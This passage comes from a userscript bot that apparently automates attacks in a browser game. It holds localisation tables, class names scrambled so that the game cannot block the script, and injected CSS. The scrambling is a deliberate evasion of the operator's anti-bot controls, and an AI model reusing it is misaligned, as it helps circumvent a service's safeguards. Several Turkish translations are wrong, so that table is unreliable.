	'Info':'Info',
	'Invalid Date From':'Data inválida De',
	'Invalid Date To':'Data inválida Para',
	'Invalid delays':'delays inválida',
	'Invalid number of troops':'Número inválido de tropas',
	'Invalid Range Date':'Intevalo de Data inválido',
	'Last Attack':'Ultimo Ataque',
	'Loaded':'carregado',
	'Logs':'Logs',
	'm':'m', 
	'Manual attack sent to':'Ataque manual enviado para',
	'Maximum simultaneous marches':'Máximo marchas simultâneas',
	'miles':'Milhas',
	'Minimum Housing':'Habitação mínima',
	'Minimum Resource Levels':'Os níveis mínimos de recursos',
	'Minutes':'Minutos',
	'No Generals Available':'Não há Generais Disponíveis',
	'No targets or troops available':'Não há alvos ou tropas disponíveis',
	'No troops available':'Tropas não disponíveis',
	'No Troops Defined':'Não foi Definido as Tropas',
	'Not enough':'Não é suficiente',
	'Not':'Não',
	'of inactivity':'de inatividade',
	'of':'de',
	'Opening the map on the last position':'Abrindo o mapa na última posição',
	'Options':'Opções',
	'Outpost 1':'Outpost 1 (Agua)',
	'Outpost 2':'Outpost 2 (Pedra)',
	'Outpost 3':'Outpost 3 (Fogo)',
	'Outpost 4':'Outpost 4 (Vento)',
	'Permanent Data':'Dados Permanentes',
	'Preparing Attack':'Preparando Ataque',
	'Refresh':'Atualizar',
	'Researching':'Pesquisando',
	'Retry in':'Repetir em',
	'Run Time':'Tempo de Execução',
	's':'s', 
	'Safe Mode':'Modo de Segurança',
	'Scanning Map':'Scaneando o Mapa',
	'Script Options':'Opções de Script',
	'Search Radius':'Busca por raio',
	'Second value must be at least':'Segundo valor deve ser Menor',
	'Seconds':'Segundos',
	'Send Dragon every certain number of waves':'Enviar o Dragão cada certo número de ondas',
	'Start Date':'Data de Inicio',
	'Stop if any troops lost':'Parar se houver perda de tropas',
	'Successfully':'Sucesso',
	'Summary':'Resumo',
	'Targets':'Alvos',
	'Task Completed':'Tarefa concluída',
	'Tasks':'Tarefas',
	'Too many errors,  disabling auto train':'Muitos erros, Desabiltar o Treinamento Automatico',
	'Too many troops for muster point level':'Muitas tropas para o seu nível de muster point',
	'Training Configuration':'Configuração de Treinamento',
	'Training queue':'Fila de Treinamento',
	'Troops for Wave Attack':'Tropas de ataque em ondas',
	'Troops lost':'Tropas perdidas',
	'Troops Not Defined':'Tropas não definidas',
	'Use the Levels Tab to select attack areas':'Use a guia Levels para selecionar áreas ataque',
	'Userset maximum marches reached':'O limite Máximo marchas foi atingido ',
	'Verbose logging':'log detalhado',
	'waiting':'Esperando',
	'Warnings':'Advertências',
	'Wave attack to':'Ataque em Ondas',
	'Wave':'Ondas',
	'Window drag':'Arrastar Janela',
	'~AquaTroop':'AquaTroop',					/* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'ArmoredTransport',		/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'Dragao de Batalha - BD',	/* idem as above */
	'~Conscript':'Conscript',					/* idem above */
	'~FireDragon':'Dragão de Fogo',				/* idem */
	'~FireMirror':'FireMirror',					/* idem */
	'~FireTroop':'FireTroop',					/* idem */
	'~Giant':'Gigante',							/* idem */
	'~GreatDragon':'Dragão Verde',				/* idem */
	'~Halberdsman':'Halberdsman',				/* idem */
	'~IceDragon':'IceDrg',						/* idem */
	'~Longbowman':'Longbowman',					/* idem */
	'~Minotaur':'Minotauro',					/* idem */
	'~Porter':'Porter',							/* idem */
	'~Spy':'Espião',							/* idem */
	'~StoneDragon':'Dragão de Pedra',			/* idem */
	'~StoneTroop':'StoneTroop',					/* idem */
	'~SwiftStrikeDragon':'SwiftStrikeDragon',	/* idem */
	'~WaterDragon':'Dragão de Agua',			/* idem */
	'~WindDragon':'Dragão do Vento',			/* idem */
	'~WindTroop':'WindTroop',					/* idem */
	'~Zzz':'Zzz'
	};
	break;
	/*******************************************************************************
		Russian (by Paxa)
	*******************************************************************************/
case 'ru':
case 'tt':
	LANG_OBJECT = {
	'above the first value':'больше первого значения', 
	'Action Logs':'Журнал действий', 
	'Actions':'Действия', 
	'and':'и', 
	'at':'в', 
	'Attack One Target in Waves':'Атаковать одну цель волнами', 
	'Attack sent to':'Войска атакуют', 
	'Attacking':'Атака', 
	'Attacks Configuration':'Настройка атак', 
	'Attacks Stats':'Статистика атак', 
	'Attacks stopped momentarily to prevent server blocking':'Атаки приостановлены для предотвращения блокировок сервером', 
	'Attacks':'Атаки', 
	'Attacks':'Атаки', 
	'Auto Refresh every':'Автообновление каждые', 
	'Automatically':'Автоматически', 
	'Awaiting task completion notification':'Ожидание результатов задания', 
	'Bandwidth Limit Exceeded':'Пропускная способность Превышен предел',
	'Building':'Строительство', 
	'Busy':'Занято', 
	'by':' ', 
	'Charging':'погрузка',
	'Cities': 'Города',
	'Clear last attack on all maps':'Очистка время атак на всех картах', 
	'Clear last attack on current map':'Очистка время атак на этой карте', 
	'Config':'Конфигурация', 
	'Console Logs':'Журнал консоли', 
	'Console':'Консоль', 
	'Coordinates':'Координаты', 
	'd':'дн.', /*abbr Day*/ 
	'Days':'Дней', 
	'Delay Between Attacks':'Пауза между атаками', 
	'Depending on available population':'Минимально по населению', 
	'Depending on available resources':'Минимально по ресурсам', 
	'Disabled':'Выключено', 
	'Distance must be between':'Расстояние должно быть между', 
	'Distance':'Расстояние', 
	'Dont flag Wildernesses':'Dont flag Wildernesses', 
	'Enable':'Включить', 
	'Enabled':'Включено', 
	'Error':'Ошибка', 
	'First value must be between':'Первое значение должно быть между', 
	'Full':'Полный', 
	'Game Options':'Настройки игры', 
	'Going to the coords':'Переход на координаты', 
	'h':'ч', /*abbr Hour*/ 
	'Hiding':'Скрыты', 
	'Hour':'Час', 
	'Hours':'Часов', 
	'Info':'Инф.', 
	'Invalid Date From':'Неправильная дата', 
	'Invalid Date To':'Неправильная дата', 
	'Invalid delays':'Неправильная пауза', 
	'Invalid number of troops':'Не корректное число войск', 
	'Invalid Range Date':'Неправильная дата', 
	'Last Attack':'Последняя атака', 
	'Loaded':'Загружено', 
	'Logs':'Журнал', 
	'm':'мин', /*abbr Minute*/ 
	'Manual attack sent to':'Ручная отправка войск', 
	'Maximum simultaneous marches':'Максимум одновременных атак', 
	'miles':'клеток', 
	'Minutes':'Минут', 
	'No targets or troops available':'Нет доступных целей или войск', 
	'No troops available':'Не хватает войск', 
	'No Troops Defined':'Не указаны войска', 
	'Not enough':'Не хватает', 
	'Not':'Не', 
	'of inactivity':'бездействия', 
	'of':' ', 
	'Opening the map on the last position':'Открытие карты на последней позиции', 
	'Options':'Настройки', 
	'water_dragon outpost':'Аутпост 1', 
	'stone_dragon outpost':'Аутпост 2', 
	'fire_dragon outpost':'Аутпост 3', 
	'wind_dragon outpost':'Аутпост 4', 
	'ice_dragon outpost':'Аутпост 5', 
	'spectral_dragon outpost':'Spectral Outpost',
	'Permanent Data':'Permanent Data', 
	'Please wait':'Пожалуйста, подождите',
	'Preparing Attack':'Подготовка к атаке', 
	'Refresh':'Обновить', 
	'Researching':'Исследование', 
	'Retry in':'Повторить', 
	'Run Time':'Время выполнения', 
	's':'сек', /*abbr Seconds*/ 
	'Safe Mode':'Безопасный режим', 
	'Scanning Map':'Сканирование карты радиусом $NUM$ клеток BR> Это займет немного времени', 
	'Script Options':'Настройки скрипта', 
	'Search Radius':'Диапазон поиска', 
	'Second value must be at least':'второе значение должно быть больше', 
	'Seconds':'Секунд', 
	'Send Dragon every certain number of waves':'Посылать Дракона в волну', 
	'spectral_dragon outpost':'Spectral Outpost',
	'Start Date':'Дата начала', 
	'Starting soon':'Начиная скоро',
	'Stop if any troops lost':'Остановить при потере войск', 
	'Successfully':'Успешно', 
	'Summary':'Итог', 
	'Targets':'Цели', 
	'Task Completed':'Задача выполнена', 
	'Tasks':'Задания', 
	'Too many errors, disabling auto train':'Много ошибок, отключение автообучения',
	'Too many requests':'Mного запросов',
	'Too many troops for muster point level':'Много войск для текущего уровня военкомата', 
	'Training Configuration':'Настройки автообучения войск', 
	'Training queue':'Очередь обучения', 
	'Troops for Wave Attack':'Войска для атаки волнами', 
	'Troops lost':'Потери войск', 
	'Troops Not Defined':'Войска не указаны', 
	'Use the Levels Tab to select attack areas':'Укажите цели для атаки на вкладке уровней', 
	'Userset maximum marches reached':'Достигнуто максимально указанное число атак',
	'Verbose logging':'Подробный журнал', 
	'waiting':'ожидание', 
	'Warnings':'Warnings', 
	'Wave attack to':'Атаковать волнами', 
	'Wave':'Волна', 
	'Window drag':'Двигать окно', 
	'Withdraw troops if they are encamped':'Отзывать войска при захвате поля', 
	'~AquaTroop':'FT',			/* Abbreviation (max. 8 characters) */ 
	'~ArmoredTransport':'AT',	/* Abbreviation (max. 8 characters) */ 
	'~BattleDragon':'BD',		/* idem as above */ 
	'~Conscript':'Conscr',		/* idem above */ 
	'~FireDragon':'FireDrg',	/* idem */ 
	'~FireMirror':'FM',			/* idem */ 
	'~FireTroop':'LJ',			/* idem */ 
	'~Giant':'Giant',			/* idem */ 
	'~GreatDragon':'GrtDrg',	/* idem */ 
	'~Halberdsman':'Halbrd',	/* idem */ 
	'~IceDragon':'IceDrg',		/* idem */
	'~Longbowman':'LBM',		/* idem */ 
	'~Minotaur':'Mino',			/* idem */ 
	'~PackDragon':'DrgCarg',	/* idem */ 
	'~Porter':'Porter',			/* idem */ 
	'~Spy':'Spy',				/* idem */ 
	'~StoneDragon':'StnDrg',	/* idem */ 
	'~StoneTroop':'Ogre',		/* idem */ 
	'~SwiftStrikeDragon':'SSD',	/* idem */
	'~SwampDragon':'SwaDrg',	/* idem */	
	'~ForestDragon':'ForDrg',	/* idem */
	'~SwampTroop':'Venom',		/* idem */	
	'~WaterDragon':'WatDrg',	/* idem */ 
	'~WindDragon':'WndDrg',		/* idem */ 
	'~WindTroop':'Banshee',		/* idem */ 
	'~DarkSlayer':'DarkSl',     /* idem */
	'~Zzz':'Zzz' 
	};
	break;
	/*******************************************************************************
		Turkish
	*******************************************************************************/
case 'tr':
case 'tk':
	LANG_CODE = 'tr';
	LANG_OBJECT = {
	'above the first value':'Ilk degerin üstünde',
	'Action Logs':'Eylem Kayitlar',
	'Actions':'Eylemler',
	'and':'ve',
	'Are you sure you want to':'Istediginiz emin',
	'at':'az',
	'Attack One Target in Waves':'Dalgalari Bir Hedef Saldiri',
	'Attack sent to':'Saldiri gönderildi',
	'Attacking':'Saldirmak',
	'Attacks Configuration':'Yapilandirma Saldirilari',
	'Attacks Logs':'Saldirilar Kayitlar',
	'Attacks stopped momentarily to prevent server blocking':'Saldirilari engelleme sunucu önlemek için bir an durdu',
	'Attacks':'Saldirilar',
	'Auto Refresh every':'Otomatik Yenileme her',
	'Auto-Collection of Resources':'Karakollarini Otomatik hasat kaynaklari her',
	'Automatically':'Otomatik',
	'Awaiting task completion notification':'Bekliyor görev tamamlama bildirimi',
	'Bandwidth Limit Exceeded':'Bant genişliği Sınırı Aşıldı',
	'Battle Report':'Raporlari Sil',
	'Building':'Bina',
	'Busy':'Mesgul',
	'by':'ile',
	'Charging':'Yükleme',
	'Cities': 'Şehirler',
	'Clear last attack on all maps':'Tüm haritalarda açik son saldiri',
	'Clear last attack on current map':'Mevcut harita üzerinde net son saldiri',
	'Config':'Yapilandirma',
	'Coordinates':'Koordinatlar',
	'd':'g',
	'Days':'Günleri',
	'Delay Between Attacks':'Saldirilar Arasindaki Gecikme',
	'Depending on available population':'Asgari Konut',
	'Depending on available resources':'Asgari Kaynak Seviyeleri',
	'Disabled':'Engelli',
	'Distance must be between':'Mesafe arasinda olmalidir',
	'Distance':'Mesafe',
	'Dont flag Wildernesses':'Arazilerde yapmayin Wildernesses saldirdi',
	'Enable':'Etkinlestir',
	'Enabled':'Etkin',
	'Error':'Hata',
	'First value must be between':'Ilk degeri arasinda olmalidir',
	'Full':'Tam',
	'Game Options':'Oyun Seçenekleri',
	'Going to the coords':'Koordinatlari gitmek',
	'h':'s',
	'Hiding':'Gizleme',
	'Hour':'Saat',
	'Hours':'Saat',
	'Info':'Bilgi',
	'Invalid Date From':'Geçersiz Tarih',
	'Invalid Date To':'Geçersiz Tarih',
	'Invalid delays':'Geçersiz gecikmeler',
	'Invalid number of troops':'Geçersiz asker sayisi',
	'Invalid Range Date':'Geçersiz Araligi Tarihi',
	'Last Attack':'Son Saldiri',
	'Loaded':'Yüklü',
	'Logs':'Kayitlar',
	'm':'d',
	'Manual attack sent to':'Ile gönderilen Manuel saldiri',
	'Maximum simultaneous marches':'Maksimum eszamanli yürüyüslerle',
	'miles':'mil',
	'Minutes':'Dakika',
	'Muster Point':'Nokta Muster',
	'My Generals':'Generaller',
	'No targets or troops available':'Yok hedefler veya asker',
	'No troops available':'Yok askerlerinin',
	'No Troops Defined':'Askerler Tanimli',
	'Not enough':'Yeterli degil',
	'Not':'Degil',
	'of inactivity':'hareketsizlik',
	'of':',',
	'Off':'bosta',
	'Opening the map on the last position':'Son konumu harita açma',
	'Options':'Seçenekler',
	'water_dragon outpost':'Su Sehri',
	'stone_dragon outpost':'Tas Sehir',
	'fire_dragon outpost':'Ates Sehir',
	'wind_dragon outpost':'Rüzgar Sehir',
	'ice_dragon outpost':'Ice Sehir',
	'spectral_dragon outpost':'Spectral Sehir',
	'Permanent Data':'Kalici Veri',
	'Please wait':'Lütfen bekleyin',
	'Preparing Attack':'Saldiri hazirlanmasi',
	'Refresh':'Yenile',
	'Required':'Gerek',
	'Researching':'Arastirma',
	'Run Time':'Çalisma Süresi',
	's':'deg',
	'Safe Mode':'Güvenli Mod',
	'Scanning Map':'Içinde $NUM$ kilometre <BR> Tarama harita bu yaklasik bir dakika zaman',
	'Script Options':'Komut Seçenekleri',
	'Search Radius':'Arama yariçapi',
	'Second value must be at least':'Ikinci deger olmali, en azindan',
	'Seconds':'Degil',
	'Send Dragon every certain number of waves':'Ejderha dalgalarin her belirli sayida Dalga',
	'spectral_dragon outpost':'Spectral Outpost',
	'Start Date':'Baslangiç ??Tarihi',
	'Starting soon':'Yakında başlıyor',
	'Statistics':'Istatistik',
	'Stop if any troops lost':'Herhangi bir asker kaybetti Durdur',
	'Successfully':'Basariyla',
	'Summary':'Özet',
	'Targets':'Hedefler',
	'Task Completed':'Görev Tamamlandi',
	'Tasks':'Görevler',
	'Too many errors,  disabling auto train':'Çok fazla hata, otomatik tren devre disi birakma',
	'Too many requests':'Çok fazla sayıda istek',
	'Too many troops for muster point level':'Görememesi noktasi seviyesi için çok sayida asker',
	'Training Configuration':'Egitim Yapilandirma',
	'Training queue':'Egitim kuyruk',
	'Troops for Wave Attack': 'Dalgalanma asker Saldirilari',
	'Troops lost':'Askerler kaybetti',
	'Troops Not Defined':'Askerler Tanimli degil',
	'Use the Levels Tab to select attack areas':'Saldiri alanlarini seçmek için Seviyeleri Sekmesini kullanin',
	'Userset maximum marches reached':'Ayarlidir maksimum ulasti yürüyüsleri',
	'Verbose logging':'Günlügü etkinlestir',
	'Verbose Logs':'Konsol Kayitlar',
	'Verbose':'Konsol',
	'waiting':'bekleyen',
	'Warnings':'Uyarilar',
	'Wave attack to':'Dalga saldiri',
	'Wave':'Dalga',
	'Window drag':'Sürükleme etkinlestirin',
	'Withdraw troops if they are encamped':'Kamp eger birliklerinin geri çekilmesi',
	'~Zzz':'Zzz'
	};
	break;
default:
	LANG_OBJECT = {
	'Dont flag Wildernesses':'Don\'t flag Wildernesses',
	'm':'m',
	'water_dragon outpost':'Water Outpost',
	'stone_dragon outpost':'Stone Outpost',
	'fire_dragon outpost':'Fire Outpost',
	'wind_dragon outpost':'Wind Outpost',
	'ice_dragon outpost':'Ice Outpost',
	'swamp_dragon outpost':'Sunken Temple',
	'forest_dragon outpost':'Gaea Spring',
	'spectral_dragon outpost':'Spectral Outpost',
	'Scanning Map':'Scanning map within $NUM$ miles<BR>This should take about a minute',
	'~AquaTroop':'Fang',			/* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'ArmTrans',	/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'BatDrg',		/* idem as above */
	'~Conscript':'Conscr',			/* idem above */
	'desert_dragon outpost':'Desert Settlers',
	'chrono_dragon outpost':'Cliffs of Chronos',
	'~DesertDragon':'HelioDrg',		/* idem */
	'~DarkSlayer':'DarkSlay',
	'~FireDragon':'FireDrg',		/* idem */
	'~FireMirror':'FireMir',		/* idem */
	'~FireTroop':'LavaJaws',		/* idem */
	'~FrostGiant':'FrostG',			/* idem */
	'~ForestTroop':'Titan',         /* idem */
	'~ForestDragon':'ForDrg',		/* idem */
	'~Giant':'Giant',				/* idem */
	'~GreatDragon':'GrtDrg',		/* idem */
	'~Halberdsman':'Halbrd',		/* idem */
	'~IceDragon':'IceDrg',			/* idem */
	'~Longbowman':'LBM',			/* idem */
	'~Minotaur':'Mino',				/* idem */
	'~PackDragon':'PckDrg',			/* idem */ 
	'~Porter':'Porter',				/* idem */
	'~Spy':'Spy',					/* idem */
	'~StoneDragon':'StnDrg',		/* idem */
	'~StoneTroop':'Ogre',			/* idem */
	'~SwiftStrikeDragon':'SSDrg',	/* idem */
	'~SwampDragon':'SwaDrg',		/* idem */
	'~SwampTroop':'Venom',			/* idem */
	'~WaterDragon':'WatDrg',		/* idem */
	'~WindDragon':'WndDrg',			/* idem */
	'~ChronoDragon':'Chrono',			/* idem */
	'~WindTroop':'Banshee',			/* idem */
	'~IceTroop':'Reaper',			/* idem */
	'~DesertTroop':'Sand',			/* idem */
	'~LightningCannon':'Light',
	'~ChargeTroop':'Storm',
	'~VengeWyrm':'Venge',
	'~DimensionalRuiner':'Ruiner',
	'~Zzz':'Zzz'
	};
}

LANG_OBJECT['WaterDragonOutpost'] = LANG_OBJECT['Outpost 1'] = LANG_OBJECT['water_dragon outpost']
LANG_OBJECT['StoneDragonOutpost'] = LANG_OBJECT['Outpost 2'] = LANG_OBJECT['stone_dragon outpost']
LANG_OBJECT['FireDragonOutpost'] = LANG_OBJECT['Outpost 3'] = LANG_OBJECT['fire_dragon outpost']
LANG_OBJECT['WindDragonOutpost'] = LANG_OBJECT['Outpost 4'] = LANG_OBJECT['wind_dragon outpost']
LANG_OBJECT['IceDragonOutpost'] = LANG_OBJECT['Outpost 5'] = LANG_OBJECT['ice_dragon outpost']
LANG_OBJECT['SwampDragonOutpost'] = LANG_OBJECT['Outpost 6'] = LANG_OBJECT['swamp_dragon outpost']
LANG_OBJECT['ForestDragonOutpost'] = LANG_OBJECT['Outpost 7'] = LANG_OBJECT['forest_dragon outpost']
LANG_OBJECT['DesertDragonOutpost'] = LANG_OBJECT['Outpost 8'] = LANG_OBJECT['desert_dragon outpost']
LANG_OBJECT['ChronoDragonOutpost'] = LANG_OBJECT['Outpost 9'] = LANG_OBJECT['chrono_dragon outpost']
LANG_OBJECT['SkythroneOutpost'] = LANG_OBJECT['kaiser_dragon outpost']

LANG_OBJECT['SpectralDragonOutpost'] = LANG_OBJECT['spectral_dragon outpost']

} // End changeLang

// Set initial Language
setLanguage();

 /********************************************************************************
* All id and class names must be scrambled to prevent the script from being    *
* blocked. These names have to be generated and allocated to CSS prior to      *
* rest of the script being initialised.                                        *
*                                                                              *
* Class List is an array containing the normal names for each class. This       *
* is then looped through and then scrambled to generate a unique name. A check *
* is done to ensure no two randmised names are the same before allowing the    *
* script to continue.                                                          *
********************************************************************************/ 
// Class List
$J.each([
	  'bnt_blue'
	 ,'bnt_cyan'
	 ,'bnt_green'
	 ,'btn_on'
	 ,'btn_off'
	 ,'btn_image_on'
	 ,'btn_image_off'
	 ,'bnt_red'
	 ,'bnt_purple'
	 ,'bnt_red'
	 ,'bnt_yellow'
	 ,'bnt_orange'
	 ,'bnt_disabled'
	 ,'bnt_image_green'
	 ,'bnt_image_red'
	 ,'bnt_image_disabled'
	 ,'bnt_image_orange'
	 ,'bold_red'
	 ,'compact_table'
	 ,'content'
	 ,'doa-icons'
	 ,'defending'
	 ,'hiding'
	 ,'hide_inputbox'
	 ,'main-box'
	 ,'march_camp'
	 ,'march_wave'
	 ,'no-attackable'
	 ,'row_top_headers'
	 ,'scrollable'
	 ,'status_feedback'
	 ,'status_report'
	 ,'status_ticker'
	 ,'subtitle'
	 ,'support_link'
	 ,'table'
	 ,'table_headers'
	 ,'title'
	 ,'green'
	 ,'blue'
	 ,'red'
	 ,'map-viewer'
	 ,'map-viewer-box'
	 ,'map-viewer-dragger'
	], function(key, value){ setUID(value); });


/** Add Scrollbar CSS Styles
******************************/
//   (this should be loaded first, but overwrites other rules)
$J("<style>").append('\
	.' + UID['main-box'] + ' ::-webkit-scrollbar {\
		width				: 1.2em;\
		height				: 1.2em;\
		 -webkit-border-radius: 1ex;\
	}\
	.' + UID['main-box'] + ' ::-webkit-scrollbar-thumb {\
		border				: 1px solid #999;\
		background			: #bbb -webkit-gradient(\
							linear,\
							right top,\
							left top,\
							color-stop(0, rgb(190,190,190)),\
							color-stop(1, rgb(250,250,250))\
							);\
		-webkit-border-radius: 1ex;\
		-webkit-box-shadow	: 1px 1px 3px rgba(0, 0, 0, 0.4);\
	}\
	.' + UID['main-box'] + ' ::-webkit-scrollbar-thumb:hover {\
		border				: 1px solid #999;\
		background			: #bbb -webkit-gradient(\
							linear,\
							right top,\
							left top,\
							color-stop(0, rgb(160,160,160)),\
							color-stop(1, rgb(230,230,230))\
							);\
	}\
	.' + UID['main-box'] + ' ::-webkit-scrollbar-track {\
		-webkit-box-shadow	: 1px 1px 5px rgba(100,100,100,0.4) inset, -1px -1px 1px rgba(150,150,150,0.9) inset;\
		-webkit-border-radius: 1ex;\
	}\
	.' + UID['main-box'] + ' ::-webkit-scrollbar-track:hover {\
		-webkit-box-shadow	: 1px 1px 5px rgba(100,100,100,0.7) inset, -1px -1px 1px rgba(150,150,150,0.9) inset;\
	}\
');
	
/** Add TeamWork_jQuery UI CSS Styles 
******************************/
$J("<style>").append('\
	/* TeamWork_jQuery UI CSS Framework 1.8.16 */\
	/* Layout helpers\
	----------------------------------*/\
	.ui-helper-hidden\
	{\
		display: none;\
	}\
	.ui-helper-hidden-accessible\
	{\
		position: absolute !important;\
		clip: rect(1px 1px 1px 1px);\
		clip: rect(1px,1px,1px,1px);\
	}\
	.ui-helper-reset\
	{\
		margin: 0;\
		padding: 0;\
		border: 0;\
		outline: 0;\
		line-height: 1.2em;\
		text-decoration: none;\
		font-size: 100%;\
		list-style: none;\
	}\
	.ui-helper-clearfix:after\
	{\
		content: ".";\
		display: block;\
		height: 0;\
		clear: both;\
		visibility: hidden;\
	}\
	.ui-helper-clearfix\
	{\
		display: inline-block;\
	}\
	/* required comment for clearfix to work in Opera \*/\
	* html .ui-helper-clearfix\
	{\
		height:1%;\
	}\
	.ui-helper-clearfix\
	{\
		display:block;\
	}\
	/* end clearfix */\
	.ui-helper-zfix\
	{\
		width: 100%;\
		height: 100%;\
		top: 0;\
		left: 0;\
		position: absolute;\
		opacity: 0;\
		filter:Alpha(Opacity=0);\
	}\
	/* Interaction Cues\
	----------------------------------*/\
	.ui-state-disabled\
	{\
		cursor: default !important;\
	}\
	/* Icons\
	----------------------------------*/\
	/* Misc visuals\
	----------------------------------*/\
	/* Overlays */\
	.ui-widget-overlay\
	{\
		position: absolute;\
		top: 0;\
		left: 0;\
		width: 100%;\
		height: 100%;\
	}\
	/* states and images */\
	.ui-icon\
	{\
		display: block;\
		text-indent: -99999px;\
		overflow: hidden;\
		background-repeat: no-repeat;\
	}\
	/* Component containers\
	----------------------------------*/\
	.ui-widget\
	{\
		font-family: Trebuchet MS, Tahoma, Verdana, Arial, sans-serif;\
		font-size: 0.9em;\
	}\
	.ui-widget .ui-widget\
	{\
		font-size: 0.9em;\
	}\
	.ui-widget input,\
	.ui-widget select,\
	.ui-widget textarea,\
	.ui-widget button\
	{\
		font-family: Trebuchet MS, Tahoma, Verdana, Arial, sans-serif;\
		font-size: 0.9em;\
	}\
	.ui-priority-primary,\
	.ui-widget-content .ui-priority-primary,\
	.ui-widget-header .ui-priority-primary\
	{\
		font-weight: bold;\
	}\
	.ui-priority-secondary,\
	.ui-widget-content .ui-priority-secondary,\
	.ui-widget-header .ui-priority-secondary\
	{\
		opacity: .7;\
		filter:Alpha(Opacity=70);\
		font-weight: normal;\
	}\
	.ui-state-disabled,\
	.ui-widget-content .ui-state-disabled,\
	.ui-widget-header .ui-state-disabled\
	{\
		opacity: .35;\
		filter:Alpha(Opacity=35);\
		background-image: none;\
	}\
	/* Icons\
	----------------------------------*/\
	/* states and images */\
	.ui-icon,\
	.ui-widget-content .ui-icon\
	{\
		width: 16px;\
		height: 16px;\
		background-image: url(https://wackoscripts.com/icons.png);\
	}\
	.ui-widget-header .ui-icon,\
	.ui-state-default .ui-icon,\
	.ui-state-hover .ui-icon,\
	.ui-state-focus .ui-icon,\
	.ui-state-active .ui-icon,\
	.ui-state-highlight .ui-icon,\
	.ui-state-error .ui-icon,\
	.ui-state-error-text .ui-icon\
	{\
		background-image: url(https://wackoscripts.com/iconimages.png);\
	}\
	/* positioning */\
	.ui-icon-alert { background-position: 0 -144px; }\
	.ui-icon-arrow-1-e { background-position: -32px -32px; }\
	.ui-icon-arrow-1-n { background-position: 0 -32px; }\
	.ui-icon-arrow-1-ne { background-position: -16px -32px; }\
	.ui-icon-arrow-1-nw { background-position: -112px -32px; }\
	.ui-icon-arrow-1-s { background-position: -64px -32px; }\
	.ui-icon-arrow-1-se { background-position: -48px -32px; }\
	.ui-icon-arrow-1-sw { background-position: -80px -32px; }\
	.ui-icon-arrow-1-w { background-position: -96px -32px; }\
	.ui-icon-arrow-2-e-w { background-position: -160px -32px; }\
	.ui-icon-arrow-2-n-s { background-position: -128px -32px; }\
	.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }\
	.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }\
	.ui-icon-arrow-4 { background-position: 0 -80px; }\
	.ui-icon-arrow-4-diag { background-position: -16px -80px; }\
	.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }\
	.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }\
	.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }\
	.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }\
	.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }\
	.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }\
	.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }\
	.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }\
	.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }\
	.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }\
	.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }\
	.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }\
	.ui-icon-arrowstop-1-e { background-position: -208px -32px; }\
	.ui-icon-arrowstop-1-n { background-position: -192px -32px; }\
	.ui-icon-arrowstop-1-s { background-position: -224px -32px; }\
	.ui-icon-arrowstop-1-w { background-position: -240px -32px; }\
	.ui-icon-arrowthick-1-e { background-position: -32px -48px; }\
	.ui-icon-arrowthick-1-n { background-position: 0 -48px; }\
	.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }\
	.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }\
	.ui-icon-arrowthick-1-s { background-position: -64px -48px; }\
	.ui-icon-arrowthick-1-se { background-position: -48px -48px; }\
	.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }\
	.ui-icon-arrowthick-1-w { background-position: -96px -48px; }\
	.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }\
	.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }\
	.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }\
	.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }\
	.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }\
	.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }\
	.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }\
	.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }\
	.ui-icon-battery-0 { background-position: -48px -176px; }\
	.ui-icon-battery-1 { background-position: -64px -176px; }\
	.ui-icon-battery-2 { background-position: -80px -176px; }\
	.ui-icon-battery-3 { background-position: -96px -176px; }\
	.ui-icon-bookmark { background-position: -224px -96px; }\
	.ui-icon-bullet { background-position: -80px -144px; }\
	.ui-icon-calculator { background-position: -112px -112px; }\
	.ui-icon-calendar { background-position: -32px -112px; }\
	.ui-icon-cancel { background-position: 0 -128px; }\
	.ui-icon-carat-1-e { background-position: -32px 0; }\
	.ui-icon-carat-1-n { background-position: 0 0; }\
	.ui-icon-carat-1-ne { background-position: -16px 0; }\
	.ui-icon-carat-1-nw { background-position: -112px 0; }\
	.ui-icon-carat-1-s { background-position: -64px 0; }\
	.ui-icon-carat-1-se { background-position: -48px 0; }\
	.ui-icon-carat-1-sw { background-position: -80px 0; }\
	.ui-icon-carat-1-w { background-position: -96px 0; }\
	.ui-icon-carat-2-e-w { background-position: -144px 0; }\
	.ui-icon-carat-2-n-s { background-position: -128px 0; }\
	.ui-icon-cart { background-position: -48px -112px; }\
	.ui-icon-check { background-position: -64px -144px; }\
	.ui-icon-circle-arrow-e { background-position: -112px -192px; }\
	.ui-icon-circle-arrow-n { background-position: -160px -192px; }\
	.ui-icon-circle-arrow-s { background-position: -128px -192px; }\
	.ui-icon-circle-arrow-w { background-position: -144px -192px; }\
	.ui-icon-circle-check { background-position: -208px -192px; }\
	.ui-icon-circle-close { background-position: -32px -192px; }\
	.ui-icon-circle-minus { background-position: -16px -192px; }\
	.ui-icon-circle-plus { background-position: 0 -192px; }\
	.ui-icon-circle-triangle-e { background-position: -48px -192px; }\
	.ui-icon-circle-triangle-n { background-position: -96px -192px; }\
	.ui-icon-circle-triangle-s { background-position: -64px -192px; }\
	.ui-icon-circle-triangle-w { background-position: -80px -192px; }\
